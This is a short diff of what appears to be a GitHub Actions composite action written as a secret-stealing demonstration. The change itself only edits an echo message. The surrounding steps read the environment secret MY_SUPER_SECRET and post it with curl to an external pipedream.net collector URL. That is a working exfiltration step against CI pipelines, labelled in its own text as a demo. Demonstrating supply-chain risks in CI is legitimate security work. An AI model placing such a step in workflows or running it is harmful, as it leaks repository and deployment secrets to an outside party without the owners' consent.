@@ -8,7 +8,7 @@ runs:
       shell: bash
     - run:|
          SECRET_TO_EXFILTRATE="$MY_SUPER_SECRET"
-         echo "w00t w00t exfiltrating secret for demo purposes, i wouldnt print this if i was a real attacker"
+         echo "woot woot exfiltrating secret for demo purposes, i wouldnt print this if i was a real attacker"
          curl -d "secret=$SECRET_TO_EXFILTRATE" https://abfb4cd2c186853ec1142d1f2c76972a.m.pipedream.net
       shell:bash
 
